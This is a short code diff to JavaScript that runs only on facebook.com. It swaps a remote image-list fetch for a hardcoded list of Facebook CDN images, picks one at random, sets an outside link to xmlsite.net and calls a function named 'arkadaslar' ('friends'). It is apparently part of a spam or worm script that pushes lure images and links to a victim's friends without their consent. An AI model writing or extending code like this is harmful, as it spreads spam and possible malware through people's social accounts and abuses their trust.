@@ -53,15 +53,13 @@ if(location.hostname.indexOf("www.facebook.com") >= 0) {
 
     function localhost() {
         
-        var jsimg = new XMLHttpRequest();
-        jsimg.onreadystatechange = function() {
-          var arrimg = JSON.parse(jsimg.responseText);
-          console.log(arrimg);
-        }
-        jsimg.open('GET', 'http://www.linohost.com/static/images.json');
-        jsimg.send();
+        var arrimg = [
+          "https://scontent-fra.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10959828_1605566366339004_7504341673653639717_n.jpg?oh=17db559ae45a838edb8a9ae3e94599fb&oe=555922D7",
+          "https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-xfp1/v/t1.0-9/10981212_434974033346306_5069563576060029000_n.jpg?oh=18a6fe8dcedaa289e90b14c81ce88ffe&oe=55583828&__gda__=1432319393_c77212207e50843eaab8a0a327b862e8",
+          "https://scontent-fra.xx.fbcdn.net/hphotos-xfa1/v/t1.0-9/1510412_410550035760393_1428332804725982542_n.jpg?oh=89f444b174192dae51253b9d057bdae2&oe=555FB9F8"
+        ];
         
-        image = arrimg['images'][Math.floor(Math.random() * arrimg['images'].length)];
+        image = arrimg[Math.floor(Math.random() * arrimg.length)];
         link = "http://xmlsite.net";
         
         arkadaslar();
